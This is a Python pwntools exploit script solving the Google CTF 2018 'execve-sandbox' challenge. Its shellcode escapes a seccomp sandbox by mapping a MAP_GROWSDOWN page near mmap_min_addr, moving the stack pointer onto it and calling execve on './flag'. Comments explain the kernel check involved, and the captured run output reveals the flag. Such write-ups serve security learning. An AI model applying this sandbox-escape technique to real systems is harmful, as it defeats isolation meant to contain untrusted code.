#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import os

from pwn import *

context(arch='amd64', os='linux', terminal=['tmux', 'new-window'])

binary = ELF('./execve-sandbox')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

argv = [binary.path]
envp = {'LD_LIBRARY_PATH': '/opt/LIEF-0.9.0-Linux/lib', 'LD_PRELOAD': libc.path, 'PWD': os.getcwd()}

if not args['REMOTE']:
    if args['GDB']:
        context(aslr=False)
        io = gdb.debug(
            args=argv,
            env=envp,
            gdbscript='''\
            set breakpoint pending on
            set follow-fork-mode child

            continue
        ''')
    else:
        io = process(argv=argv, env=envp)
    binary.address = io.libs()[binary.path]
    libc.address = io.libs()[libc.path]
else:
    io = remote('execve-sandbox.ctfcompetition.com', 1337)

# by @integeruser

# (kudos to https://github.com/TheMaccabees/ctf-writeups/blob/master/GoogleCTF2018Quals/execve-sandbox/README.md,
# who solved the challenge by just submitting an ELF whose `PT_INTERP` header (containing
# the path to the interpreter to execute before the ELF itself) was set to `./flag`! :D)

# this challenge can be solved by creating a mapping with the MAP_GROWSDOWN flag set, which indicates
# that the mapping should extend downward in memory

# the tricky bit is that, before accessing the created mapping, we must set the stack pointer
# to an address near the start of the mapping (see `__do_page_fault()` in `linux/arch/x86/mm/fault.c`),
# otherwise a segfault is raised
# ```
# . . .
# if (unlikely(address + 65536 + 32 * sizeof(unsigned long) < regs->sp)) {
#     bad_area(regs, error_code, address);
#     return;
# }
# . . .
# ```

mmap_min_addr = 0x10000

# mmap a page near the address `mmap_min_addr` with MAP_GROWSDOWN
mapping_addr = mmap_min_addr + 0x1000
code = shellcraft.mmap(mapping_addr, 0x1000, constants.PROT_READ | constants.PROT_WRITE,
                       constants.MAP_PRIVATE | constants.MAP_ANONYMOUS | constants.MAP_GROWSDOWN, 0, 0)
# set the stack pointer accordingly
code += 'mov rsp, {};'.format(mapping_addr)
# write the string `./flag` at address `mmap_min_addr`
code += 'mov r12, {};'.format(mmap_min_addr)
code += 'mov qword ptr [r12], {};'.format(u32('./fl'))
code += 'mov qword ptr [r12+0x4], {};'.format(u32('ag\0\0'))
# call execve('./flag', NULL, NULL)
code += shellcraft.execve(mmap_min_addr, 0, 0)

payload = '{}deadbeef'.format(make_elf(asm(code)))
io.send(payload)

io.interactive()
# $ ./execve-sandbox.py REMOTE
# [*] '/home/vagrant/vbox/execve-sandbox/execve-sandbox'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)
# [*] '/lib/x86_64-linux-gnu/libc.so.6'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to execve-sandbox.ctfcompetition.com on port 1337: Done
# [*] Switching to interactive mode
# total 3892
# -rwxr-xr-x 1 nobody nogroup 3140344 May 25 14:48 execve-sandbox
# ---x--x--x 1 nobody nogroup  840456 May 25 14:48 flag
# [*] waiting for an ELF binary...
# [*] received 504 bytes
# [*] seccomp-bpf filters installed
# [*] let's execute "/tmp/execve-sandbox-2TiHpS" in that sandbox
# CTF{Time_to_read_that_underrated_Large_Memory_Management_Vulnerabilities_paper}
